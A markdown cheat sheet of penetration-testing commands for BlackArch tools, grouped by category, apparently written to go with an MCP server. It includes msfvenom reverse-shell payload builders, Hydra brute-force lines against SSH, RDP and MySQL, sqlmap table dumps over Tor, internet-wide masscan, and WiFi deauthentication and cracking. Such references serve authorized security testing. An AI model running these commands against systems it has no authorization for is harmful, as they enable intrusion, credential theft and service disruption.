# BLACKARCH SECURITY TOOLS CHEAT SHEET

> Complete reference for 2863+ penetration testing tools organized by category.

---

## QUICK REFERENCE

### Top 10 Categories
| # | Category | Tools | Use Case |
|---|----------|-------|----------|
| 1 | WEBAPP | 309 | Web application testing |
| 2 | SCANNER | 305 | Network discovery |
| 3 | RECON | 257 | OSINT & recon |
| 4 | EXPLOITATION | 182 | Exploit development |
| 5 | CRACKER | 162 | Password attacks |
| 6 | FORENSIC | 154 | Digital forensics |
| 7 | WINDOWS | 154 | Windows security |
| 8 | NETWORKING | 146 | Traffic analysis |
| 9 | WIRELESS | 67 | WiFi auditing |
| 10 | BINARY | 64 | Reverse engineering |

---

## 📡 SCANNER (305 tools)

### Nmap - Network Mapper
```bash
# Basic scans
nmap target.com                    # Quick scan
nmap -sV target.com               # Version detection
nmap -sC target.com               # Default scripts
nmap -p- target.com               # All ports
nmap -A target.com                # Aggressive (OS, version, scripts, traceroute)
nmap -sU target.com               # UDP scan
nmap -O target.com                 # OS detection

# Advanced
nmap --script=vuln target.com     # Vulnerability scripts
nmap --script=banner target.com   # Banner grabbing
nmap -Pn target.com               # No ping (firewall bypass)
nmap -sS -sU -T4 target.com       # SYN + UDP fast

# Network enumeration
nmap -sL target.com/24            # List scan
nmap -PR target.com/24           # ARP scan (local network)
nmap --top-ports 100 target.com   # Top 100 ports

# Output
nmap -oA results target.com      # All output formats
nmap -oX results.xml target.com  # XML output
```

### Masscan - Fast Scanner
```bash
masscan -p1-65535 target.com --rate=10000
masscan -p80,443,8080 0.0.0.0/0 --rate=5000
masscan -p1-1000 10.0.0.0/24 --banners
```

### Rustscan - Modern Port Scanner
```bash
rustscan -a target.com --batch 1
rustscan -a target.com --top --rate 4500
```

### Amass - Subdomain Enumeration
```bash
amass enum -passive -d target.com
amass enum -active -d target.com -ip 192.168.1.1
amass intel -whois -d target.com
amass viz -d3 -o report.html
```

---

## 🌐 WEBAPP (309 tools)

### SQLMap - SQL Injection
```bash
# Basic
sqlmap -u "http://target.com/?id=1" --batch
sqlmap -u "http://target.com/?id=1" --dbs
sqlmap -u "http://target.com/?id=1" -D database --tables
sqlmap -u "http://target.com/?id=1" -D database -T users --dump

# Advanced
sqlmap -u "http://target.com/" --data="id=1" --level=5 --risk=3
sqlmap -u "http://target.com/" --cookie="PHPSESSID=xxx" --tor
sqlmap -r request.txt --batch
```

### Dirb / Dirbuster - Directory Fuzzing
```bash
dirb http://target.com
dirb http://target.com /usr/share/wordlists/dirb/common.txt
dirb http://target.com -w

# Dirbuster GUI
dirbuster &
```

### Burp Suite - Web Proxy
```bash
# Start
burpsuite &
# Configure proxy: 127.0.0.1:8080
# Browser: localhost:8080
```

### FFUF - Fast Web Fuzzer
```bash
ffuf -w wordlist.txt -u http://target.com/FUZZ
ffuf -w wordlist.txt -u http://target.com/path/FUZZ -fc 404
ffuf -w subdomains.txt -u http://FUZZ.target.com
```

### Nuceli - Vulnerability Templates
```bash
nuclei -u http://target.com
nuclei -l urls.txt
nuclei -l urls.txt -t cves/
nuclei -u http://target.com -severity critical,high
```

### XSS Tools
```bash
dalfox url http://target.com/?param=test
dalfox -f urls.txt -w 10
xsstrike -u http://target.com/?param=test
xsstrike --crawl --Depth 2
```

---

## 💥 EXPLOITATION (182 tools)

### Metasploit Framework
```bash
msfconsole
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f python
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f war > shell.war
```

### SearchSploit
```bash
searchsploit keyword
searchsploit -m 12345.py
searchsploit linux kernel 4.4
searchsploit --exact "Exploit Title"
```

### ExploitDB
```bash
searchsploit -c "local"
searchsploit remote
searchsploit android
```

---

## 🔐 CRACKER (162 tools)

### Hashcat
```bash
# Mode numbers
# 0 = MD5, 100 = NTLM, 1000 = NTLM, 1400 = SHA256, 1700 = SHA512
# 5500 = NetNTLMv1/v2, 5600 = NetNTLMv2

hashcat -m 0 -a 0 hash.txt wordlist.txt
hashcat -m 1000 -a 0 hash.txt wordlist.txt
hashcat -m 5600 hash.txt --show
hashcat -m 0 hash.txt -r rules/best64.rule
hashcat -m 0 hash.txt --increment --increment-max 8
```

### John the Ripper
```bash
john --wordlist=wordlist.txt hash.txt
john --show hash.txt
john --format=nt2 hash.txt
john --rules --wordlist=wordlist.txt hash.txt
```

### Hydra - Network Brute Force
```bash
hydra -l admin -P passwords.txt ssh://target.com
hydra -L users.txt -P passwords.txt ssh://target.com
hydra -l admin -P passwords.txt http-post-form://target.com/login:username=^USER^&password=^PASS^:F=failed
hydra -l root -P passwords.txt mysql://target.com
hydra -l admin -P passwords.txt rdp://target.com
```

### Crunch - Wordlist Generator
```bash
crunch 8 12 abc123 -o wordlist.txt
crunch 4 6 0123456789 -o pins.txt
crunch 1 8 -t @@^^%%% -o wordlist.txt
```

---

## 📡 WIRELESS (67 tools)

### Aircrack-ng Suite
```bash
# Monitor mode
airmon-ng start wlan0
airmon-ng check kill

# Capture
airodump-ng wlan0mon
airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture

# Deauth
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack
aircrack-ng capture-01.cap -w wordlist.txt
```

### Wifite
```bash
wifite --all
wifite --wpa --dict wordlist.txt
wifite --wps
```

### Wifiphisher
```bash
wifiphisher --interface wlan0
```

### Reaver - WPS Attack
```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
bully -i wlan0mon -b AA:BB:CC:DD:EE:FF
```

---

## 🕵️ RECON (257 tools)

### theHarvester
```bash
theHarvester -d target.com -b google
theHarvester -d target.com -b linkedin
theHarvester -d target.com -b all
theHarvester -d target.com -b shodan
```

### Recon-ng
```bash
recon-ng
marketplace search
marketplace install recon/domains-contacts/whois
workspaces add target
db insert domains target.com
run
```

### Subfinder / Assetfinder
```bash
subfinder -d target.com
subfinder -d target.com -o results.txt
assetfinder target.com | grep target.com
```

### Amass
```bash
amass enum -passive -d target.com
amass enum -active -d target.com -brute
amass intel -whois -d target.com
```

---

## 📱 MOBILE (44 tools)

### Frida - Dynamic Instrumentation
```bash
frida-ps -Uai
frida-trace -U -i "ssl*" com.target.app
frida -U -f com.target.app -l script.js
```

### Objection
```bash
objection explore
objection -g com.target.app explore
android hooking search classes crypto
```

### APKTool
```bash
apktool d app.apk -o output/
apktool b output/ -o modified.apk
```

### JADX
```bash
jadx -d output app.apk
```

---

## 🔍 FORENSIC (154 tools)

### Binwalk - Firmware Analysis
```bash
binwalk firmware.bin
binwalk -e firmware.bin
binwalk -A binary.bin
binwalk -M -e firmware.bin
```

### Volatility - Memory Forensics
```bash
volatility -f memory.dmp --profile=Win10x64 pslist
volatility -f memory.dmp --profile=Win10x64 netscan
volatility -f memory.dmp --profile=Win10x64 hashdump
volatility -f memory.dmp --profile=Win10x64 filescan
```

### Autopsy
```bash
autopsy &
# Open browser to http://localhost:9999
```

---

## 🔐 CRYPTO (81 tools)

### OpenSSL
```bash
# Encryption
openssl enc -aes-256-cbc -in file.txt -out file.enc
openssl enc -d -aes-256-cbc -in file.enc -out file.txt

# Certificates
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
openssl x509 -in cert.pem -text -noout

# Hashing
openssl dgst -sha256 file.txt
```

---

## 🛠️ BINARY (64 tools)

### Radare2
```bash
r2 binary
aaa                    # Analyze all
afl                    # List functions
pdf @ main             # Disassemble main
s main                 # Seek to main
V                      # Visual mode
```

### Ghidra
```bash
ghidraRun
# Import binary → Analyze → Browse exports, imports, strings, functions
```

---

## 🎯 QUICK COMMANDS BY PHASE

### Information Gathering
```bash
nmap -sC -sV -O target.com
amass enum -passive -d target.com
theHarvester -d target.com -b all
nikto -h target.com
```

### Vulnerability Assessment
```bash
nuclei -u http://target.com -severity critical,high
sqlmap -u http://target.com/?id=1 --batch
dalfox url http://target.com/?param=test
ffuf -w wordlist.txt -u http://target.com/FUZZ
```

### Exploitation
```bash
searchsploit keyword
msfconsole
msfvenom -p payload LHOST=IP -f format -o shell
```

### Post-Exploitation
```bash
# Linux
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Windows
msfvenom -p windows/meterpreter/reverse_tcp
```

---

## MCP SERVER USAGE

```bash
# Start server
python3 blackarch_mcp_v2.py

# Example: Get webapp tools
echo '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"get_tools","arguments":{"category":"webapp"}}}' | python3 blackarch_mcp_v2.py
```

---

## INSTALL COMMON TOOLS

```bash
# BlackArch
pacman -Syu blackarch-webapp blackarch-scanner

# Kali
apt install nmap sqlmap burpsuite

# All
yay -S nmap sqlmap metasploit
```

---

*Generated: 2025-05-10 | Total: 2,863 tools in 48 categories*